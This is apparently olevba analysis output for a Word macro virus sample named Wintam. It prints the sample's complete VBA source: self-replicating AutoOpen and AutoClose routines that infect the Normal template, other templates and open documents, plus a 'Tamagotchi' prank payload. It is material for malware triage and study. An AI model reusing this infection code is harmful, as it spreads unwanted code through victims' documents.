olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Wintam
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Wintam - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO WinTam.bas 
in file: Virus.MSWord.Wintam - OLE stream: 'Macros/VBA/WinTam'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const CountMessage = 4
Dim Message(CountMessage)
Dim Answer(CountMessage)
Dim Exec(CountMessage)
Dim Text(CountMessage)


Sub Init()
    Message(0) = "Тамагочі хоче спати. Закрийте всі активні програми і натисніть кнопку Reset..."
    Answer(0) = "Я буду плакати !"
    Exec(0) = ""
    Text(0) = "Я вже плачу ... Е - Е - Е   ЕЕЕЕЕ  Е ЕЕ ее  ЕЕ ..."
    
    Message(1) = "Тамагочі голодний. Вставте бутерброд зі салом у дисковод А:..."
    Answer(1) = "Тамагочі починає їсти " + ActiveDocument.Name
    Exec(1) = ""
    Text(1) = "Гам ! Гам ! Гам !"
    
    Message(2) = "Тамагочі хоче погратися в DOOM2. Скажіть бах, я здаюся..."
    Answer(2) = "Натисніть IDDQD і продовжуємо DOOMати!"
    Exec(2) = ""
    Text(2) = "IDDQD IDKFA"
    
    Message(3) = "Тамагочі готовиться стати мінером. Попробуйте знайти, де сховався Тамагочі..."
    Answer(3) = "Сапером можеш ти не бути, та віддихати все ж потрібно!"
    Exec(3) = "WinMine.exe"
    Text(3) = "Бух !"
    
    Message(4) = "Питання від Тамагочі. Скільки буде 2+2 ?..."
    Answer(4) = ""
    Exec(4) = "Calc.exe"
    Text(4) = "2+2=?"
    
    Ans = MsgBox("Поздоровляємо Вас. Ви усиновили Тамагочі на даний сеанс роботи! Прохання берегти його, годувати, не залишати в холодному місці!", vbOKOnly + vbInformation, "Microsoft Word", "", 0)
    
    Application.OnTime When:=Now + TimeValue("00:03:00"), Name:="QUEST"
End Sub

Sub AutoOpen()
    
    Application.OnTime When:=Now + TimeValue("00:15:00"), Name:="Init"
    
    Application.DisplayAlerts = wdAlertsNone
    
    For Each AutoText In NormalTemplate.AutoTextEntries
        If AutoText.Name = "Тамагочі" Then Exit Sub
    Next AutoText
    
    Set AT = NormalTemplate.AutoTextEntries.Add("Тамагочі", Selection.Range)
    Application.OrganizerCopy Source:= _
       ActiveDocument.FullName, Destination:= _
       NormalTemplate.FullName, Name:="WinTam", Object:=wdOrganizerObjectProjectItems
    
End Sub

Sub AutoClose()
    
    For Each Templ In Templates
  
    For Each AutoText In Templ.AutoTextEntries
        If AutoText.Name = "Тамагочі" Then GoTo NoInfectedTemplate
    Next AutoText
    
    Set AT = Templ.AutoTextEntries.Add("Тамагочі", Selection.Range)
    Application.OrganizerCopy Source:= _
       NormalTemplate.FullName, Destination:= _
       Templ.FullName, Name:="Тамагочі", Object:=wdOrganizerObjectProjectItems

NoInfectedTemplate:
    Next Templ
    
    For Each Docs In Documents
   
        For C = 1 To Docs.Versions.Count
            If Docs.Versions(C).Comment = "Тамагочі" Then GoTo NoInfectedDoc
        Next C
        
        If Docs.Type = wdTypeTemplate Then GoTo NoInfectedDoc
    
        If Docs.Path <> "" Then Application.OrganizerCopy Source:= _
            NormalTemplate.FullName, Destination:= _
            Docs.FullName, Name:="WinTam", Object:=wdOrganizerObjectProjectItems: _
            Docs.Versions.Save Comment:="Тамагочі": Docs.AttachedTemplate = ""
        
NoInfectedDoc:
    Next Docs
   
End Sub

Sub Test()
    OnTime
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Exec                |May run an executable file or a system       |
|          |                    |command using Excel 4 Macros (XLM/XLF)       |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |WinMine.exe         |Executable file name                         |
|IOC       |Calc.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

